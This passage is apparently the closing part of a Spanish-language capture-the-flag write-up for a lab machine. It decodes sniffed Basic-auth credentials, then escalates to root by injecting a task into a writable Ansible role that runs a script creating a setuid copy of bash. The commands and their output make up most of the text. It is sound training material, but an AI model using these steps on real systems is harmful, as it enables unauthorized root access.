+</span></span></span><span style=display:flex><span><span style=color:#e6db74>20:26:01.931196 IP localhost.53732 &gt; localhost.http: Flags [P.], seq 1:224, ack 1, win 683, options [nop,nop,TS val 2560860 ecr 2560860], length 223: HTTP: GET /test-auth/index.html HTTP/1.1
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>E...}e@.@..}...........Pj.n@}w.s...........
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.&#39;</span>.<span style=color:#ae81ff>\.</span><span style=color:#960050;background-color:#1e0010>&#39;</span>.<span style=color:#ae81ff>\G</span>ET /test-auth/index.html HTTP/1.1
+</span></span><span style=display:flex><span>Host: 127.0.0.1
+</span></span><span style=display:flex><span>User-Agent: python-requests/2.14.2
+</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
+</span></span><span style=display:flex><span>Accept: */*
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>Authorization: Basic dG<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>s<span style=color:#f92672>=</span>
+</span></span></code></pre></div><p>Esto es extraño, pero ahora tenemos una solicitud <code>HTTP</code>, con un encabezado de &lsquo;Autorización&rsquo; enviado&mldr;</p><p>¡Vamos a decodificar esa texto en <code>base64</code> para ver qué hay dentro!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>simeon@aratus test-auth<span style=color:#f92672>]</span>$ echo <span style=color:#e6db74>&#34;dG[REDACTED]s=&#34;</span> | base64 -d
+</span></span><span style=display:flex><span>theodore:Ri<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>ik
+</span></span></code></pre></div><p>¡Sí! ¡Ahora tenemos las credenciales para <code>theodore</code> y finalmente podemos obtener la flag de usuario!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>simeon@aratus test-auth<span style=color:#f92672>]</span>$ su theodore
+</span></span><span style=display:flex><span>Password:
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>theodore@aratus test-auth<span style=color:#f92672>]</span>$ cat ~/user.txt
+</span></span><span style=display:flex><span>THM<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
+</span></span></code></pre></div><h2 id=root>Root</h2><p>¡Tiempo de enumeración otra vez!</p><p>Podemos ejecutar un script específico con el usuario <code>automation</code> y <code>sudo</code>&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>theodore@aratus ~<span style=color:#f92672>]</span>$ sudo -l
+</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> theodore on aratus:
+</span></span><span style=display:flex><span>    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
+</span></span><span style=display:flex><span>    env_keep<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;</span>, env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;MAIL PS1 PS2 QTDIR
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span>, env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    LC_MESSAGES&#34;</span>, env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;</span>,
+</span></span><span style=display:flex><span>    env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span>,
+</span></span><span style=display:flex><span>    secure_path<span style=color:#f92672>=</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>User theodore may run the following commands on aratus:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>automation<span style=color:#f92672>)</span> NOPASSWD: /opt/scripts/infra_as_code.sh
+</span></span></code></pre></div><p>¡Veamos este script rapidamente!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>theodore@aratus ~<span style=color:#f92672>]</span>$ cat /opt/scripts/infra_as_code.sh
+</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash</span>
+</span></span><span style=display:flex><span>cd /opt/ansible
+</span></span><span style=display:flex><span>/usr/bin/ansible-playbook /opt/ansible/playbooks/*.yaml
+</span></span></code></pre></div><p>Parece un script para ejecutar <code>ansible</code>. Si no sabes qué es <code>ansible</code>, <a href="https://www.ansible.com/resources/get-started?hsLang=en-us">aquí tienes más información</a>!</p><p>Entonces, después de googlear un poco cómo funciona <code>ansible</code>, comenzamos a buscar algunas tareas dentro de la carpeta <code>ansible</code> que podemos editar&mldr;</p><p>¡Resulta que dentro del rol/carpeta <code>geerlingguy.apache</code> hay una tarea con el nombre <code>configure-RedHat.yml</code> y podemos editarla!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>theodore@aratus ~<span style=color:#f92672>]</span>$ ls -la /opt/ansible/roles/geerlingguy.apache/tasks/
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>36</span>
+</span></span><span style=display:flex><span>drwxr-xr-x. <span style=color:#ae81ff>2</span> automation automation  <span style=color:#ae81ff>228</span> Dec  <span style=color:#ae81ff>2</span> 11:55 .
+</span></span><span style=display:flex><span>drwxr-xr-x. <span style=color:#ae81ff>9</span> automation automation  <span style=color:#ae81ff>178</span> Dec  <span style=color:#ae81ff>2</span> 11:55 ..
+</span></span><span style=display:flex><span>-rw-rw-r--. <span style=color:#ae81ff>1</span> automation automation <span style=color:#ae81ff>1693</span> Dec  <span style=color:#ae81ff>2</span> 11:55 configure-Debian.yml
+</span></span><span style=display:flex><span>-rw-rw-r--+ <span style=color:#ae81ff>1</span> automation automation <span style=color:#ae81ff>1211</span> Mar <span style=color:#ae81ff>26</span> 20:04 configure-RedHat.yml
+</span></span><span style=display:flex><span>-rw-rw-r--. <span style=color:#ae81ff>1</span> automation automation  <span style=color:#ae81ff>546</span> Dec  <span style=color:#ae81ff>2</span> 11:55 configure-Solaris.yml
+</span></span><span style=display:flex><span>-rw-rw-r--. <span style=color:#ae81ff>1</span> automation automation  <span style=color:#ae81ff>711</span> Dec  <span style=color:#ae81ff>2</span> 11:55 configure-Suse.yml
+</span></span><span style=display:flex><span>-rw-rw-r--. <span style=color:#ae81ff>1</span> automation automation <span style=color:#ae81ff>1388</span> Dec  <span style=color:#ae81ff>2</span> 11:55 main.yml
+</span></span><span style=display:flex><span>-rw-rw-r--. <span style=color:#ae81ff>1</span> automation automation  <span style=color:#ae81ff>193</span> Dec  <span style=color:#ae81ff>2</span> 11:55 setup-Debian.yml
+</span></span><span style=display:flex><span>-rw-rw-r--. <span style=color:#ae81ff>1</span> automation automation  <span style=color:#ae81ff>198</span> Dec  <span style=color:#ae81ff>2</span> 11:55 setup-RedHat.yml
+</span></span><span style=display:flex><span>-rw-rw-r--. <span style=color:#ae81ff>1</span> automation automation  <span style=color:#ae81ff>134</span> Dec  <span style=color:#ae81ff>2</span> 11:55 setup-Solaris.yml
+</span></span><span style=display:flex><span>-rw-rw-r--. <span style=color:#ae81ff>1</span> automation automation  <span style=color:#ae81ff>133</span> Dec  <span style=color:#ae81ff>2</span> 11:55 setup-Suse.yml
+</span></span></code></pre></div><p>¡Aquí está el contenido, contiene todo lo necesario para ejecutar un <code>servidor web apache</code>!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>theodore@aratus ~<span style=color:#f92672>]</span>$ cat /opt/ansible/roles/geerlingguy.apache/tasks/configure-RedHat.yml
+</span></span><span style=display:flex><span>---
+</span></span><span style=display:flex><span>- name: Configure Apache.
+</span></span><span style=display:flex><span>  lineinfile:
+</span></span><span style=display:flex><span>    dest: <span style=color:#e6db74>&#34;{{ apache_server_root }}/conf/{{ apache_daemon }}.conf&#34;</span>
+</span></span><span style=display:flex><span>    regexp: <span style=color:#e6db74>&#34;{{ item.regexp }}&#34;</span>
+</span></span><span style=display:flex><span>    line: <span style=color:#e6db74>&#34;{{ item.line }}&#34;</span>
+</span></span><span style=display:flex><span>    state: present
+</span></span><span style=display:flex><span>    mode: <span style=color:#ae81ff>0644</span>
+</span></span><span style=display:flex><span>  with_items: <span style=color:#e6db74>&#34;{{ apache_ports_configuration_items }}&#34;</span>
+</span></span><span style=display:flex><span>  notify: restart apache
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>- name: Check whether certificates defined in vhosts exist.
+</span></span><span style=display:flex><span>  stat: path<span style=color:#f92672>={{</span> item.certificate_file <span style=color:#f92672>}}</span>
+</span></span><span style=display:flex><span>  register: apache_ssl_certificates
+</span></span><span style=display:flex><span>  with_items: <span style=color:#e6db74>&#34;{{ apache_vhosts_ssl }}&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>- name: Add apache vhosts configuration.
+</span></span><span style=display:flex><span>  template:
+</span></span><span style=display:flex><span>    src: <span style=color:#e6db74>&#34;{{ apache_vhosts_template }}&#34;</span>
+</span></span><span style=display:flex><span>    dest: <span style=color:#e6db74>&#34;{{ apache_conf_path }}/{{ apache_vhosts_filename }}&#34;</span>
+</span></span><span style=display:flex><span>    owner: root
+</span></span><span style=display:flex><span>    group: root
+</span></span><span style=display:flex><span>    mode: <span style=color:#ae81ff>0644</span>
+</span></span><span style=display:flex><span>  notify: restart apache
+</span></span><span style=display:flex><span>  when: apache_create_vhosts | bool
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>- name: Check <span style=color:#66d9ef>if</span> localhost cert exists <span style=color:#f92672>(</span>RHEL <span style=color:#ae81ff>8</span> and later<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>  stat:
+</span></span><span style=display:flex><span>    path: /etc/pki/tls/certs/localhost.crt
+</span></span><span style=display:flex><span>  register: localhost_cert
+</span></span><span style=display:flex><span>  when: ansible_distribution_major_version | int &gt;<span style=color:#f92672>=</span> <span style=color:#ae81ff>8</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>- name: Ensure httpd certs are installed <span style=color:#f92672>(</span>RHEL <span style=color:#ae81ff>8</span> and later<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>  command: /usr/libexec/httpd-ssl-gencerts
+</span></span><span style=display:flex><span>  when:
+</span></span><span style=display:flex><span>    - ansible_distribution_major_version | int &gt;<span style=color:#f92672>=</span> <span style=color:#ae81ff>8</span>
+</span></span><span style=display:flex><span>    - not localhost_cert.stat.exists
+</span></span></code></pre></div><p>Entonces, simplemente agregamos una tarea final dentro de ese archivo, ¡para que podamos ejecutar un exploit!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>- name: exploiting you bruh
+</span></span><span style=display:flex><span>  command: /bin/sh /tmp/exploit.sh
+</span></span><span style=display:flex><span>  args:
+</span></span><span style=display:flex><span>   warn: false
+</span></span></code></pre></div><p>Aquí está el exploit que creamos, un simple copiar y pegar para el binario <code>bash</code>, ¡pero usando el sticky bit! Básicamente, si alguien más ejecuta el archivo, lo ejecutará como el usuario/grupo que lo creó, en este caso, ¡el usuario <code>root</code>!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>theodore@aratus ~<span style=color:#f92672>]</span>$ cat /tmp/exploit.sh
+</span></span><span style=display:flex><span>cp /bin/bash /tmp/bash ; chmod +s /tmp/bash
+</span></span></code></pre></div><p>¡Y ahora podemos ejecutar con sudo el comando!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>theodore@aratus ~<span style=color:#f92672>]</span>$ sudo -u automation /opt/scripts/infra_as_code.sh
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PLAY <span style=color:#f92672>[</span>Check status of the firewall<span style=color:#f92672>]</span> ****************************************************************
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>TASK <span style=color:#f92672>[</span>Gathering Facts<span style=color:#f92672>]</span> *****************************************************************************
+</span></span><span style=display:flex><span>ok: <span style=color:#f92672>[</span>10.10.170.245<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>TASK <span style=color:#f92672>[</span>check firewalld<span style=color:#f92672>]</span> *****************************************************************************
+</span></span><span style=display:flex><span>ok: <span style=color:#f92672>[</span>10.10.170.245<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>TASK <span style=color:#f92672>[</span>geerlingguy.apache : Ensure httpd certs are installed <span style=color:#f92672>(</span>RHEL <span style=color:#ae81ff>8</span> and later<span style=color:#f92672>)</span>.<span style=color:#f92672>]</span> *******************
+</span></span><span style=display:flex><span>skipping: <span style=color:#f92672>[</span>10.10.170.245<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>TASK <span style=color:#f92672>[</span>geerlingguy.apache : exploiting you bruh<span style=color:#f92672>]</span> ****************************************************
+</span></span><span style=display:flex><span>changed: <span style=color:#f92672>[</span>10.10.170.245<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span></code></pre></div><p>En el fragmento anterior, ejecutamos <code>exploiting you bruh</code> con éxito, así que revisemos la carpeta <code>/tmp/</code> donde deberíamos tener nuestro nuevo binario <code>bash</code> con permisos <code>root</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>theodore@aratus ~<span style=color:#f92672>]</span>$ ls -la /tmp
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>1892</span>
+</span></span><span style=display:flex><span>drwxrwxrwt.  <span style=color:#ae81ff>8</span> root     root        <span style=color:#ae81ff>232</span> Mar <span style=color:#ae81ff>26</span> 20:10 .
+</span></span><span style=display:flex><span>dr-xr-xr-x. <span style=color:#ae81ff>17</span> root     root        <span style=color:#ae81ff>224</span> Mar <span style=color:#ae81ff>25</span> 22:14 ..
+</span></span><span style=display:flex><span>drwxrwxrwt.  <span style=color:#ae81ff>2</span> root     root          <span style=color:#ae81ff>6</span> Jun  <span style=color:#ae81ff>8</span>  <span style=color:#ae81ff>2021</span> .ICE-unix
+</span></span><span style=display:flex><span>drwxrwxrwt.  <span style=color:#ae81ff>2</span> root     root          <span style=color:#ae81ff>6</span> Jun  <span style=color:#ae81ff>8</span>  <span style=color:#ae81ff>2021</span> .Test-unix
+</span></span><span style=display:flex><span>drwxrwxrwt.  <span style=color:#ae81ff>2</span> root     root          <span style=color:#ae81ff>6</span> Jun  <span style=color:#ae81ff>8</span>  <span style=color:#ae81ff>2021</span> .X11-unix
+</span></span><span style=display:flex><span>drwxrwxrwt.  <span style=color:#ae81ff>2</span> root     root          <span style=color:#ae81ff>6</span> Jun  <span style=color:#ae81ff>8</span>  <span style=color:#ae81ff>2021</span> .XIM-unix
+</span></span><span style=display:flex><span>drwxrwxrwt.  <span style=color:#ae81ff>2</span> root     root          <span style=color:#ae81ff>6</span> Jun  <span style=color:#ae81ff>8</span>  <span style=color:#ae81ff>2021</span> .font-unix
+</span></span><span style=display:flex><span>-rwsr-sr-x.  <span style=color:#ae81ff>1</span> root     root     <span style=color:#ae81ff>964536</span> Mar <span style=color:#ae81ff>26</span> 20:08 bash
+</span></span><span style=display:flex><span>-rw-rw-r--.  <span style=color:#ae81ff>1</span> theodore theodore     <span style=color:#ae81ff>38</span> Mar <span style=color:#ae81ff>26</span> 20:09 exploit.sh
+</span></span><span style=display:flex><span>drwx------.  <span style=color:#ae81ff>3</span> root     root         <span style=color:#ae81ff>17</span> Mar <span style=color:#ae81ff>26</span> 19:40 systemd-private-cdbd947aa2a64a4aa122319c880cbfa3-httpd.service-7CkbTf
+</span></span><span style=display:flex><span>-rw-------.  <span style=color:#ae81ff>1</span> theodore theodore      <span style=color:#ae81ff>0</span> Mar <span style=color:#ae81ff>26</span> 19:57 tmp.Pov2h3UlaW
+</span></span></code></pre></div><p>¡Vamos! ¡Tenemos el binario y el dueño es <code>root</code>! Entonces ahora podemos ejecutar <code>bash</code> con los permisos del propietario, con la opción <code>-p</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>theodore@aratus tmp<span style=color:#f92672>]</span>$ ./bash -p
+</span></span><span style=display:flex><span>bash-4.2# id; whoami
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>theodore<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>theodore<span style=color:#f92672>)</span> euid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> egid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>,1001<span style=color:#f92672>(</span>theodore<span style=color:#f92672>)</span> context<span style=color:#f92672>=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+</span></span><span style=display:flex><span>root
+</span></span><span style=display:flex><span>bash-4.2# cat /root/root.txt
+</span></span><span style=display:flex><span>THM<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
+</span></span></code></pre></div><p>¡Y hemos rooteado la máquina!</p><p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Leer otros posts</span><hr></div><div class=pagination__buttons><span class="button next"><a href=/es/posts/ohmywebserver/><span class=button__text>Oh My WebServer - Write Up - Español</span>
+<span class=button__icon>→</span></a></span></div></div><div id=hyvor-talk-view></div><script type=text/javascript>var HYVOR_TALK_WEBSITE=5554,HYVOR_TALK_CONFIG={url:!1,id:!1}</script><script async type=text/javascript src=//talk.hyvor.com/web-api/embed.js></script></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><a href=https://www.linkedin.com/in/joaquin-lanfranconi/>Lanfran02</a></div></div></footer><script src=/assets/main.js></script>
+<script src=/assets/prism.js></script><script src=/assets/medium-zoom/medium-zoom.min.js></script>
+<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(e=>{mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"#292a2d"})})</script><script type=module src=/assets/ionicons/ionicons.esm.js></script>
+<script nomodule src=/assets/ionicons/ionicons.js></script></div><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script></body></html>
